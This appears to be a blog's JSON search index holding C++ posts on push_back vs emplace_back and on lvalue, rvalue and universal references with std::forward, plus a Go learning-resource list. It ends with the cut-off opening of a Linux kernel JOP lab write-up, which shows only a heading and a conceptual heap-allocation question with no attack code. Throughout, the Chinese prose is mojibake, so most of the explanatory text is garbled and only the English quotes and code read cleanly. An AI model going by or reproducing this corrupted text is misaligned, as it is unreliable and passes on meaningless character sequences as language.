Reference std::vector\u0026lt;T,Allocator\u0026gt;::push_back - cppreference.com\nstd::vector\u0026lt;T,Allocator\u0026gt;::emplace_back - cppreference.com\npush_back vs emplace_back\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-12T10:00:00Z","image":"https://unicocn.github.io/p/cpp-emplace_back-vs-push_back/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/cpp-emplace_back-vs-push_back/","title":"ç†è§£ push_back ï½œ emplace_back"},{"content":"ç†è§£ä¸‡èƒ½å¼•ç”¨ | å·¦å€¼å¼•ç”¨ | å³å€¼å¼•ç”¨ åœ¨å†™C++ä»£ç æ—¶ï¼Œè¢«ä¸‡èƒ½å¼•ç”¨ã€å·¦å€¼å¼•ç”¨å’Œå³å€¼å¼•ç”¨çš„é—®é¢˜å›°æ‰°äº†å¾ˆä¹…ï¼Œäºæ˜¯èŠ±äº†ç‚¹æ—¶é—´æ•´ç†äº†ç›¸å…³æ¦‚å¿µï¼Œå¹¶åšäº†ä¸€ä¸ªæ€»ç»“\nå·¦å€¼å’Œå³å€¼ The original definition of lvalues and rvalues from the earliest days of C is as follows: AnÂ lvalueÂ is an expressionÂ eÂ that may appear on the left or on the right hand side of an assignment, whereas anÂ rvalueÂ is an expression that can only appear on the right hand side of an assignment.\næœ€åˆï¼Œå·¦å€¼å’Œå³å€¼çš„æ¦‚å¿µæ¥è‡ªCï¼Œå·¦å€¼æ˜¯å¯ä»¥å‡ºç°åœ¨èµ‹å€¼è¯­å¥å·¦ä¾§å’Œå³ä¾§çš„è¡¨è¾¾å¼ï¼Œå³å€¼æ˜¯ä»…èƒ½å‡ºç°åœ¨èµ‹å€¼è¯­å¥å³è¾¹çš„è¡¨è¾¾å¼\n1 2 3 4 5 6 7 8 9 10 11 int a = 42; int b = 43; // a and b are both lvalues: a = b; // ok b = a; // ok a = a * b; // ok // a * b is an rvalue: int c = a * b; // ok, rvalue on right hand side of assignment a * b = 42; // error, rvalue on left hand side of assignment å·¦å€¼å³å€¼ä¸ä»…ä»…æŒ‡ä¸€ä¸ªå˜é‡ï¼Œä¸¥æ ¼æ¥è¯´æ˜¯æŒ‡ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œä¾‹å¦‚ x++ã€a*bï¼›äº‹å®ä¸Šå¯¹ç¼–è¯‘å™¨æ¥è¯´ï¼Œä¸€ä¸ªå˜é‡ä¹Ÿè¢«å½“ä½œä¸€ä¸ªè¡¨è¾¾å¼\nåœ¨ä¹‹åçš„C++ä¸­ï¼Œç”±äºå¼•å…¥äº†é¢å‘å¯¹è±¡ç‰¹æ€§ä»¥åŠæ›´ä¸ºå¤æ‚çš„èµ‹å€¼æ–¹å¼ï¼Œå·¦å€¼å³å€¼çš„æ¦‚å¿µè¿›è¡Œäº†æ‹“å±•ï¼›å°½ç®¡å¾ˆéš¾å¯¹å·¦å€¼å³å€¼ä¸‹ä¸€ä¸ªå‡†ç¡®çš„å®šä¹‰ï¼Œä½†æ˜¯åœ¨ç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•å¯¹äºŒè€…è¿›è¡ŒåŒºåˆ†ï¼š\nAnÂ lvalueÂ is an expression that refers to a memory location and allows us to take the address of that memory location via theÂ \u0026amp;Â operator. AnÂ rvalueÂ is an expression that is not an lvalue\nå·¦å€¼æ˜¯æ‹¥æœ‰ä¸€ä¸ªç¨‹åºå¯ä»¥è®¿é—®çš„åœ°å€çš„è¡¨è¾¾å¼ï¼Œå…è®¸æˆ‘ä»¬é€šè¿‡ \u0026amp; è¿ç®—ç¬¦è·å–è¯¥åœ°å€ï¼›å¦‚æœä¸€ä¸ªè¡¨è¾¾å¼ä¸æ˜¯å·¦å€¼ï¼Œé‚£å®ƒå°±æ˜¯å³å€¼\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int i, j, *p; // Correct usage: // the variable i is an lvalue and the literal 7 is a rvalue. i = 7; // Incorrect usage: // The left operand must be an lvalue (C2106). `j * 4` is a rvalue. 7 = i; // C2106 j * 4 = 7; // C2106 // Correct usage: the dereferenced pointer is an lvalue. *p = i; // Correct usage: the conditional operator returns an lvalue. ((i \u0026lt; 3) ? i : j) = 7; // Incorrect usage: the constant ci is a non-modifiable lvalue (C3892). const int ci = 7; ci = 9; // C3892 If the type of an expression is an lvalue reference (e.g.,Â T\u0026amp;Â orÂ const T\u0026amp;, etc.), that expression is an lvalue.\nç‰¹åˆ«æ³¨æ„ï¼Œå·¦å€¼å¼•ç”¨å’Œå¸¸é‡å·¦å€¼å¼•ç”¨ä¹Ÿæ˜¯å·¦å€¼ï¼ˆæ— è®ºæ˜¯å¦ä¸ºä¸´æ—¶å¯¹è±¡ï¼Œæ¯”è¾ƒåç›´è§‰ï¼‰ï¼Œè€Œå³å€¼å¼•ç”¨å¯ä»¥æ˜¯å·¦å€¼ä¹Ÿå¯ä»¥æ˜¯å³å€¼ï¼ŒåŒºåˆ«åœ¨äºæ˜¯å¦æ˜¯ä¸´æ—¶å¯¹è±¡\näº‹å®ä¸ŠC++ä¸­æœ‰ä¸€ä¸ªä¸“é—¨çš„è¯value categoryï¼Œç”¨æ¥å½¢å®¹è¡¨è¾¾å¼çš„å·¦å³å€¼ç‰¹æ€§ï¼ŒåŒæ—¶å¯¹æ­¤è¿›è¡Œäº†æ›´ä¸ºå…·ä½“çš„åˆ’åˆ†(since C++17)\nglvalueï¼šå¹¿ä¹‰å·¦å€¼ rvalueï¼šå³å€¼ lvalueï¼šå·¦å€¼ xvalueï¼šå°†äº¡å€¼ prvalueï¼šçº¯å³å€¼ ç”±äºvalue categoryçš„ç»†èŠ‚æ¯”è¾ƒå¤æ‚ï¼Œè¯¦ç»†å†…å®¹å¯ä»¥å‚è€ƒä¸‹é¢çš„é“¾æ¥ï¼š\nValue Categories: Lvalues and Rvalues (C++)\nValue categories - cppreference.com\nReferenceï¼š\nC++ Rvalue References Explained\nå·¦å€¼å¼•ç”¨å’Œå³å€¼å¼•ç”¨ å·¦å€¼å¼•ç”¨ IfXis any type, thenX\u0026amp;is called an lvalue reference toX. It holds the address of an object but behaves syntactically like an object\nå·¦å€¼å¼•ç”¨å¯ä»¥è¢«å½“ä½œä¸€ç§æ›¿ä»£æŒ‡é’ˆçš„syntax sugarï¼Œä½†æ˜¯ç”±äºå…¶å£°æ˜æ—¶å¿…é¡»ç»‘å®šä¸€ä¸ªå¯¹è±¡ï¼Œä¸”ä¸å¯ä»¥æ›´æ¢ç»‘å®šå¯¹è±¡ï¼Œå› æ­¤ç›¸æ¯”è£¸æŒ‡é’ˆå…·æœ‰æ›´å¼ºçš„å†…å­˜å®‰å…¨ä¿éšœï¼›åŒæ—¶å·¦å€¼å¼•ç”¨è¢«ç”¨ä½œæ‹·è´æ„é€ å’Œæ‹·è´èµ‹å€¼\n1 2 3 4 5 6 class Window { public: Window( const Window\u0026amp; ); // Declare copy constructor. Window\u0026amp; operator=(const Window\u0026amp; x); // Declare copy assignment. // ... }; å·¦å€¼å¼•ç”¨å¯ä»¥ç»‘å®šå·¦å€¼ï¼Œä¸å¯ä»¥ç»‘å®šå¸¸é‡å·¦å€¼å’Œå³å€¼\nå¸¸é‡å·¦å€¼å¼•ç”¨å¯ä»¥ç»‘å®šå·¦å€¼ã€å¸¸é‡å·¦å€¼å’Œå³å€¼\n1 2 3 4 5 6 7 8 int a = 1; const int b = 1; int\u0026amp; c = 1; // incorrect int\u0026amp; d = a; // correct int\u0026amp; e = b; // incorrect const int\u0026amp; f = a; // correct const int\u0026amp; g = b; // correct const int\u0026amp; h = 1; // correct å³å€¼å¼•ç”¨ IfXis any type, thenX\u0026amp;\u0026amp;is called an rvalue referencetoX\nå³å€¼å¼•ç”¨å¯ä»¥ç†è§£ä¸ºç»‘å®šå³å€¼çš„å¼•ç”¨ï¼Œä¸”å³å€¼å¼•ç”¨ä»…èƒ½ç»‘å®šå³å€¼\nRvalue references enable you to distinguish an lvalue from an rvalue\nå³å€¼å¼•ç”¨çš„å¼•å…¥åŸºäºä¸¤ç§éœ€æ±‚\nç§»åŠ¨è¯­ä¹‰ å½“äººä»¬å¸Œæœ›å°†å¯¹è±¡Bèµ‹å€¼ç»™å¯¹è±¡Aæ—¶ï¼Œå·¦å€¼å¼•ç”¨å¸¦æ¥çš„æ‹·è´ç‰¹æ€§èƒ½å¤Ÿå¸®åŠ©å®ç°è¿™ä¸€åŠŸèƒ½ï¼›ä½†æ˜¯ä¸ºäº†æå‡æ•ˆç‡ï¼Œå½“å¯¹è±¡Båœ¨èµ‹å€¼ç»™å¯¹è±¡Aä¹‹åå°±ä¸å†è¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆå®Œå…¨å¯ä»¥å°†å¯¹è±¡Bçš„èµ„æºè½¬ç§»ç»™å¯¹è±¡Aï¼ˆåº•å±‚é€šè¿‡æŒ‡é’ˆçš„æ–¹å¼å®ç°ï¼‰ï¼Œè¿›è€Œé¿å…æ‹·è´çš„èµ„æºæ¶ˆè€—ï¼Œäººä»¬ç§°ä¹‹ä¸ºç§»åŠ¨è¯­ä¹‰ï¼›éœ€è¦æ³¨æ„ï¼Œåœ¨å°†å¯¹è±¡Bçš„èµ„æºè½¬ç§»ç»™å¯¹è±¡Aåï¼Œå°±ä¸åº”è¯¥å†ä½¿ç”¨å¯¹è±¡B\næˆ‘ä»¬å¯ä»¥é€šè¿‡ç§»åŠ¨æ„é€ å’Œç§»åŠ¨èµ‹å€¼ä¸¤ç§æ–¹å¼å®ç°ç§»åŠ¨è¯­ä¹‰\n1 2 3 4 5 6 class Window { public: Window(Window\u0026amp;\u0026amp; ) noexcept; // Declare move constructor. Window\u0026amp; operator=(Window\u0026amp;\u0026amp; x) noexcept; // Declare move assignment. // ... }; å®Œç¾è½¬å‘ Perfect forwarding reduces the need for overloaded functions and helps avoid the forwarding problem. TheÂ forwarding problemÂ can occur when you write a generic function that takes references as its parameters. If it passes (orÂ forwards) these parameters to another function, for example, if it takes a parameter of typeÂ const T\u0026amp;, then the called function can\u0026rsquo;t modify the value of that parameter. If the generic function takes a parameter of typeÂ T\u0026amp;, then the function can\u0026rsquo;t be called by using an rvalue (such as a temporary object or integer literal).\n1 2 3 4 5 6 template\u0026lt;class T\u0026gt; void wrapper(T\u0026amp;\u0026amp; arg) { // arg is always lvalue foo(std::forward\u0026lt;T\u0026gt;(arg)); // Forward as lvalue or as rvalue, depending on T } å®Œç¾è½¬å‘å¯ä»¥å¸®åŠ©äººä»¬è§£å†³è½¬å‘é—®é¢˜ï¼š\nè€ƒè™‘ä¸€ç§æƒ…å†µï¼Œç°åœ¨æˆ‘ä»¬éœ€è¦å°†ä¸€ä¸ªå³å€¼ä½œä¸ºå‚æ•°ä¼ å…¥å‡½æ•°ï¼Œåœ¨æ²¡æœ‰å³å€¼å¼•ç”¨çš„æƒ…å†µä¸‹è¯¥å¦‚ä½•å®ç°ï¼Ÿ\né¦–å…ˆå·¦å€¼å¼•ç”¨æ— æ³•ç»‘å®šå³å€¼ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨å·¦å€¼å¼•ç”¨ï¼›å¸¸é‡å·¦å€¼å¼•ç”¨å°½ç®¡å¯ä»¥ç»‘å®šå³å€¼ï¼Œä½†æ˜¯ç”±äºå¸¸é‡ï¼Œåœ¨å‡½æ•°ä½“ä¸­å°±æ— æ³•å¯¹å‚æ•°è¿›è¡Œä¿®æ”¹\n1 2 3 4 // forwardçš„å…·ä½“å®ç°ï¼Œæœ¬è´¨æ˜¯ç±»å‹è½¬æ¢ template\u0026lt;typename _Tp\u0026gt; constexpr _Tp\u0026amp;\u0026amp; forward(typename std::remove_reference\u0026lt;_Tp\u0026gt;::type\u0026amp; __t) noexcept { return static_cast\u0026lt;_Tp\u0026amp;\u0026amp;\u0026gt;(__t); } åŸºäºä¸Šé¢ä¸¤ç§éœ€æ±‚ï¼Œäººä»¬éœ€è¦ä¸€ç§æ–°çš„ä¸åŒäºå·¦å€¼å¼•ç”¨çš„æ–¹å¼ï¼Œä½¿å¾—èƒ½å¤Ÿå®ç°ç§»åŠ¨è¯­ä¹‰å’Œå®Œç¾è½¬å‘ï¼Œå› æ­¤ä¹Ÿå°±å¼•å…¥äº†å³å€¼å¼•ç”¨\nReferenceï¼š\nLvalue reference declarator: \u0026amp;\nRvalue reference declarator: \u0026amp;\u0026amp;\nè°ˆè°ˆå®Œç¾è½¬å‘(Perfect Forwarding)ï¼šå®Œç¾è½¬å‘ = å¼•ç”¨æŠ˜å  + ä¸‡èƒ½å¼•ç”¨ + std::forward\nCopy constructors - cppreference.com\nMove constructors - cppreference.com\nä¸‡èƒ½å¼•ç”¨å’Œå¼•ç”¨æŠ˜å  å£°æ˜å³å€¼å¼•ç”¨ä½¿ç”¨çš„ç¬¦å·ä¸º\u0026amp;\u0026amp;ï¼Œä½†æ˜¯ä½¿ç”¨\u0026amp;\u0026amp;ç¬¦å·çš„å´ä¸ä¸€å®šæ˜¯å³å€¼å¼•ç”¨ï¼Œè¿™ä¹Ÿæ˜¯C++ç¨‹åºä¸­éå¸¸ä»¤äººå›°æƒ‘çš„ä¸€ç‚¹\n1 2 3 4 5 6 7 8 9 Widget\u0026amp;\u0026amp; var1 = someWidget; // here, â€œ\u0026amp;\u0026amp;â€ means rvalue reference auto\u0026amp;\u0026amp; var2 = var1; // here, â€œ\u0026amp;\u0026amp;â€ does not mean rvalue reference template\u0026lt;typename T\u0026gt; void f(std::vector\u0026lt;T\u0026gt;\u0026amp;\u0026amp; param); // here, â€œ\u0026amp;\u0026amp;â€ means rvalue reference template\u0026lt;typename T\u0026gt; void f(T\u0026amp;\u0026amp; param); // here, â€œ\u0026amp;\u0026amp;â€does not mean rvalue reference The essence of the issue is that â€œ\u0026amp;\u0026amp;â€ in a type declaration sometimes means rvalue reference, but sometimes it meansÂ eitherÂ rvalue referenceÂ orÂ lvalue reference. As such, some occurrences of â€œ\u0026amp;\u0026amp;â€ in source code may actually have the meaning of â€œ\u0026amp;â€, i.e., have the syntacticÂ appearanceÂ of an rvalue reference (â€œ\u0026amp;\u0026amp;â€), but theÂ meaningÂ of an lvalue reference (â€œ\u0026amp;â€).\nåœ¨ä¸€äº›æ—¶å€™ï¼Œ\u0026amp;\u0026amp; æ—¢å¯ä»¥ç»‘å®šå·¦å€¼ï¼Œä¹Ÿå¯ä»¥ç»‘å®šå³å€¼ï¼Œäººä»¬ç§°å…¶ä¸ºä¸‡èƒ½å¼•ç”¨(universal reference)\næ³¨ï¼šäº‹å®ä¸Šåœ¨cpp referenceä¸­ï¼Œå¹¶æ²¡æœ‰universal referenceçš„ç§°å‘¼ï¼Œå…¶ä¸­å…±å®šä¹‰äº†å››ç§å¼•ç”¨ï¼Œåˆ†åˆ«æ˜¯lvalue referenceã€rvalue referenceã€forwarding referenceä»¥åŠdangling referenceï¼Œå…¶ä¸­forwarding referenceå°±æ˜¯universal referenceï¼Œå¯ä»¥å‚è€ƒä¸‹é¢é“¾æ¥ä¸­çš„å›ç­”\nIs there a difference between universal references and forwarding references?\nä»€ä¹ˆæ—¶å€™\u0026amp;\u0026amp; è¡¨ç¤ºä¸‡èƒ½å¼•ç”¨ If a variable or parameter is declared to have typeÂ T\u0026amp;\u0026amp;Â for someÂ deduced typeÂ T, that variable or parameter is aÂ universal reference.\nå¦‚æœä¸€ä¸ªå˜é‡æˆ–è€…å‚æ•°è¢«å£°æ˜ä¸ºT\u0026amp;\u0026amp;ï¼Œå…¶ä¸­Tæ˜¯è¢«æ¨å¯¼çš„ç±»å‹ï¼Œé‚£è¿™ä¸ªå˜é‡æˆ–è€…å‚æ•°å°±æ˜¯ä¸€ä¸ªä¸‡èƒ½å¼•ç”¨ï¼Œå½¢å¦‚auto\u0026amp;\u0026amp; ã€T\u0026amp;\u0026amp; ï¼Œæ³¨æ„Téœ€è¦æ˜¯è¢«æ¨å¯¼çš„ç±»å‹\nä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 template\u0026lt;typename T\u0026gt; void f(T\u0026amp;\u0026amp; param); // deduced parameter type â‡’ type deduction; // \u0026amp;\u0026amp; â‰¡ universal reference template\u0026lt;typename T\u0026gt; class Widget { ... Widget(Widget\u0026amp;\u0026amp; rhs); // fully specified parameter type â‡’ no type deduction; ... // \u0026amp;\u0026amp; â‰¡ rvalue reference }; template\u0026lt;typename T1\u0026gt; class Gadget { ... template\u0026lt;typename T2\u0026gt; Gadget(T2\u0026amp;\u0026amp; rhs); // deduced parameter type â‡’ type deduction; ... // \u0026amp;\u0026amp; â‰¡ universal reference }; void f(Widget\u0026amp;\u0026amp; param); // fully specified parameter type â‡’ no type deduction; // \u0026amp;\u0026amp; â‰¡ rvalue reference // push_back canâ€™t exist without the class std::vector\u0026lt;T\u0026gt; that contains it. // But if we have a class std::vector\u0026lt;T\u0026gt;, we already know what T is // so thereâ€™s no need to deduce it. template \u0026lt;class T\u0026gt; class vector { public: ... void push_back(T\u0026amp;\u0026amp; x); // fully specified parameter type â‡’ no type deduction; ... // \u0026amp;\u0026amp; â‰¡ rvalue reference }; template \u0026lt;class T, class Allocator = allocator\u0026lt;T\u0026gt; \u0026gt; class vector { public: ... template \u0026lt;class... Args\u0026gt; void emplace_back(Args\u0026amp;\u0026amp;... args); // deduced parameter types â‡’ type deduction; ... // \u0026amp;\u0026amp; â‰¡ universal references }; ä¸‡èƒ½å¼•ç”¨ä»€ä¹ˆæ—¶å€™è¡¨ç¤ºå·¦å€¼ï¼Ÿä»€ä¹ˆæ—¶å€™è¡¨ç¤ºå³å€¼ï¼Ÿ If the expression initializing a universal reference is an lvalue, the universal reference becomes an lvalue reference. (T\u0026amp; \u0026amp;\u0026amp; â†’ T\u0026amp;) If the expression initializing the universal reference is an rvalue, the universal reference becomes an rvalue reference. (T \u0026amp;\u0026amp; â†’ T\u0026amp;\u0026amp;è€Œä¸æ˜¯T\u0026amp;\u0026amp; \u0026amp;\u0026amp; â†’ T\u0026amp;\u0026amp;) æ­¤æ—¶æˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œå‚è€ƒå¦‚ä¸‹ä»£ç \n1 2 3 4 5 6 7 template\u0026lt;typename T\u0026gt; void f(T\u0026amp;\u0026amp; param); ... int x; ... f(10); // invoke f on rvalue f(x); // invoke f on lvalue æ­¤æ—¶å¯¹äºf(10)æ¥è¯´ï¼ŒTè¢«æ¨å¯¼ä¸ºintï¼Œä¹Ÿå°±æ˜¯void f(int\u0026amp;\u0026amp; param)ï¼Œä½†æ˜¯å¯¹äºf(x)ï¼Œæ ¹æ®ä¸‡èƒ½å¼•ç”¨è§„åˆ™ï¼ŒTè¢«æ¨å¯¼ä¸ºint\u0026amp; ï¼Œä¹Ÿå°±æ˜¯void f(int\u0026amp; \u0026amp;\u0026amp; param)ï¼Œ\u0026amp; \u0026amp;\u0026amp; è¿™æ ·çš„å¼•ç”¨å£°æ˜çœ‹ä¸Šå»å¹¶ä¸åˆæ³•ï¼›ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒC++æ ‡å‡†å¼•å…¥äº†å¼•ç”¨æŠ˜å çš„æ¦‚å¿µ\nIt is permitted to form references to references through type manipulations in templates or typedefs, in which case theÂ reference collapsingÂ rules apply: rvalue reference to rvalue reference collapses to rvalue reference, all other combinations form lvalue reference:\n1 2 3 4 5 6 7 8 typedef int\u0026amp; lref; typedef int\u0026amp;\u0026amp; rref; int n; lref\u0026amp; r1 = n; // type of r1 is int\u0026amp; lref\u0026amp;\u0026amp; r2 = n; // type of r2 is int\u0026amp; rref\u0026amp; r3 = n; // type of r3 is int\u0026amp; rref\u0026amp;\u0026amp; r4 = 1; // type of r4 is int\u0026amp;\u0026amp; è‡³æ­¤ï¼Œä¸‡èƒ½å¼•ç”¨çš„ç±»å‹æ¨æ–­å°±å˜çš„åˆæ³•äº†\nReferenceï¼š\nUniversal References in C++11 \u0026ndash; Scott Meyers : Standard C++\nReference declaration - cppreference.com\nå¸¸è§è¯¯åŒº ğŸŒŸ æŸä¸ªå˜é‡çš„ç±»å‹æ˜¯å·¦å€¼å³å€¼ Every C++ expression has a type, and belongs to aÂ value category. The value categories are the basis for rules that compilers must follow when creating, copying, and moving temporary objects during expression evaluation.\nå·¦å€¼å³å€¼ä¸æ˜¯ä¸€ç§ç±»å‹ï¼Œè€Œæ˜¯value categoryï¼Œé€šå¸¸æ˜¯ç”¨äºå¸®åŠ©ç¼–è¯‘å™¨é€‰æ‹©å¦‚ä½•å¯¹ä¸€ä¸ªå¯¹è±¡è¿›è¡Œåˆ›å»º/èµ‹å€¼/ç§»åŠ¨\nthe lvalueness or rvalueness of an expression is independent of its type. Consider the typeÂ int.Â There are lvalues of typeÂ intÂ (e.g., variables declared to beÂ int), and there are rvalues of typeÂ intÂ (e.g., literals likeÂ 10).\nä½¿ç”¨å³å€¼å¼•ç”¨ä¸€å®šå¯ä»¥å‡å°‘å†…å­˜æ‹·è´ ä¸¥æ ¼æ„ä¹‰ä¸Šè®²ï¼Œå‡å°‘å†…å­˜æ‹·è´çš„æ˜¯ç§»åŠ¨è¯­ä¹‰ï¼Œè€Œä¸æ˜¯å³å€¼å¼•ç”¨ï¼›å³å€¼å¼•ç”¨çš„ç›®çš„æ˜¯ä¸ºäº†å®ç°ç§»åŠ¨è¯­ä¹‰ï¼Œä½†æ˜¯ä½¿ç”¨å³å€¼å¼•ç”¨ä¸ä»£è¡¨å°±å®ç°äº†ç§»åŠ¨è¯­ä¹‰\nå¦‚æœæ²¡æœ‰å®ç°ç§»åŠ¨æ„é€ å’Œç§»åŠ¨èµ‹å€¼ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ\nå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç°ç§»åŠ¨æ„é€ å’Œç§»åŠ¨èµ‹å€¼ï¼Œä½†ä½¿ç”¨äº†ç§»åŠ¨è¯­ä¹‰ï¼Œé‚£ä¹ˆmoveä¼šé€€åŒ–æˆcopyï¼›éœ€è¦æ³¨æ„åœ¨ä¸€äº›æƒ…å†µä¸‹ç¼–è¯‘å™¨ä¼šç”Ÿæˆé»˜è®¤ç§»åŠ¨æ„é€ å’Œé»˜è®¤ç§»åŠ¨èµ‹å€¼å‡½æ•°\nå·¦å€¼å¼•ç”¨ç±»å‹çš„å˜é‡æ˜¯å·¦å€¼ï¼Œå³å€¼å¼•ç”¨ç±»å‹çš„å˜é‡æ˜¯å³å€¼ï¼›å‡½æ•°çš„å‚æ•°ä¸ºå·¦å€¼/å³å€¼å¼•ç”¨ç±»å‹ï¼Œä»–ä»¬åœ¨å‡½æ•°ä½“ä¸­å°±æ˜¯å·¦å€¼/å³å€¼ The compiler treats a named rvalue reference as an lvalue and an unnamed rvalue reference as an rvalue\nå·¦å€¼å³å€¼å’Œç±»å‹æ˜¯ç‹¬ç«‹çš„æ¦‚å¿µï¼Œä¸€ä¸ªå³å€¼å¼•ç”¨ç±»å‹çš„å˜é‡å¯ä»¥æ˜¯å·¦å€¼ï¼Œå°†å³å€¼å¼•ç”¨ä½œä¸ºå‚æ•°çš„å‡½æ•°ä¼šå°†è¯¥å‚æ•°è§†ä¸ºå‡½æ•°ä½“ä¸­çš„å·¦å€¼ï¼›ä¸€ä¸ªå³å€¼å¼•ç”¨ç±»å‹çš„å˜é‡ä¹Ÿå¯ä»¥æ˜¯å³å€¼ï¼Œæ¯”å¦‚print(forward\u0026lt;int\u0026gt;(x))çš„ç»“æœä¸ºprint(int \u0026amp;\u0026amp;)ï¼Œint \u0026amp;\u0026amp;ä¸ºä¸´æ—¶å˜é‡ï¼Œæ•…ä¸ºå³å€¼\nå…·ä½“è§ä¸‹é¢çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 template\u0026lt;typename T\u0026gt; void print(T\u0026amp; t){ cout \u0026lt;\u0026lt; \u0026#34;lvalue\u0026#34; \u0026lt;\u0026lt; endl; } template\u0026lt;typename T\u0026gt; void print(T\u0026amp;\u0026amp; t){ cout \u0026lt;\u0026lt; \u0026#34;rvalue\u0026#34; \u0026lt;\u0026lt; endl; } template\u0026lt;typename T\u0026gt; void TestForward(T\u0026amp;\u0026amp; v){ print(v); // ä»»ä½•çš„å‡½æ•°å†…éƒ¨ï¼Œå¯¹å½¢å‚çš„ç›´æ¥ä½¿ç”¨ï¼Œéƒ½æ˜¯æŒ‰ç…§å·¦å€¼è¿›è¡Œçš„ print(std::forward\u0026lt;T\u0026gt;(v)); print(std::move(v)); } int main(){ TestForward(1); // int \u0026amp;\u0026amp; -\u0026gt; int \u0026amp;\u0026amp; ï¼ŒTä¸ºintï¼Œvæ˜¯å³å€¼å¼•ç”¨ç±»å‹ int x = 1; TestForward(x); // int\u0026amp; \u0026amp;\u0026amp; -\u0026gt; int \u0026amp;ï¼ŒTä¸ºint\u0026amp;ï¼Œvæ˜¯å·¦å€¼å¼•ç”¨ç±»å‹ TestForward(std::forward\u0026lt;int\u0026gt;(x)); // int \u0026amp;\u0026amp; -\u0026gt; int \u0026amp;\u0026amp;ï¼ŒTä¸ºintï¼Œvæ˜¯å³å€¼å¼•ç”¨ç±»å‹ // forward\u0026lt;int\u0026gt;(x)å¾—åˆ°çš„æ˜¯ä¸´æ—¶å˜é‡ï¼Œç±»å‹ä¸ºint \u0026amp;\u0026amp;ï¼Œè¿›å…¥TestForward, Tä¸ºint return 0; } /* Outputï¼š lvalue rvalue rvalue lvalue lvalue rvalue lvalue rvalue rvalue */ Written by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-10T10:00:00Z","image":"https://unicocn.github.io/p/cpp-understand-reference/cover_hu6170f1f82b3711c204643e7d26f97db9_36645_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/cpp-understand-reference/","title":"ç†è§£ä¸‡èƒ½å¼•ç”¨ï½œå·¦å€¼å¼•ç”¨ï½œå³å€¼å¼•ç”¨"},{"content":"å¦‚ä½•å­¦ä¹ Golang å¿«é€Ÿå…¥é—¨ï¼š Go by Example ä¸­æ–‡ç‰ˆ\nå°é¡¹ç›®ï¼š 7å¤©ç”¨Goä»é›¶å®ç°åˆ†å¸ƒå¼ç¼“å­˜GeeCache\nGoè¯­è¨€è®¾è®¡ä¸å®ç°ï¼š Go è¯­è¨€è®¾è®¡ä¸å®ç°\nGoè¯­è¨€åœ£ç»ï¼š Goè¯­è¨€åœ£ç»\nGoå­¦ä¹ è·¯çº¿ï¼š å­—èŠ‚è·³åŠ¨Goè¯­è¨€å­¦ä¹ è·¯çº¿å›¾\nWritten by Jiacheng Hu, at Zhejiang University, Hangzhou, China.\n","date":"2023-06-07T23:50:00Z","image":"https://unicocn.github.io/p/go/cover_hued9042ee9f0e7aee045d9f1b3a4675de_133670_120x120_fill_box_smart1_3.png","permalink":"https://unicocn.github.io/p/go/","title":"Goè¯­è¨€å­¦ä¹ è·¯çº¿"},{"content":"Lab3 JOP | Linuxå†…æ ¸æ¼æ´æ”»é˜² Link: https://zjusec.gitee.io/syssec23-stu/lab3/\næ€è€ƒé¢˜1 Q1. ä¸ºä»€ä¹ˆåœ¨å †ä¸Šåˆ†é…ç›¸åŒå¤§å°å†…å­˜çš„æ—¶å€™ï¼Œä¸¤æ¬¡åˆ†é…çš„å†…å­˜åœ°å€ä¼šä¸€æ ·\nLinuxå†…æ ¸åœ¨å †ä¸Šåˆ†é…å†…å­˜æ—¶ï¼Œé€šå¸¸ä¼šä½¿ç”¨å¦‚ä¸‹ç³»ç»Ÿè°ƒç”¨\nmalloc(åˆ†é…å°å—å†…å­˜æ—¶è°ƒç”¨) brkï¼šå°†æ•°æ®æ®µ(.data)çš„æœ€é«˜åœ°å€æŒ‡é’ˆ_edataå¾€é«˜åœ°å€æ¨ï¼ˆä»å †å¤´å¼€å§‹ï¼Œå‚æ•°ä¸ºåœ°å€ï¼‰ sbrkï¼šå°†åœ°å€æŒ‡é’ˆå¾€é«˜åœ°å€æ¨ï¼ˆä»å½“å‰æŒ‡é’ˆä½ç½®å¼€å§‹ï¼Œå‚æ•°ä¸ºæŒ‡é’ˆå¢é‡ï¼‰ mmap(é»˜è®¤åˆ†é…å¤§äº128kå†…å­˜æ—¶è°ƒç”¨) ç”±äºé¢‘ç¹çš„åˆ†é…é‡Šæ”¾å†…å­˜å®¹æ˜“äº§ç”Ÿç¢ç‰‡ï¼Œå¹¶ä¸”ä¼šå½±å“æ€§èƒ½ï¼Œå› æ­¤Linuxå¼•å…¥äº†åŸºäºå†…å­˜æ± çš„å†…å­˜ç®¡ç†æ–¹å¼ï¼Œå 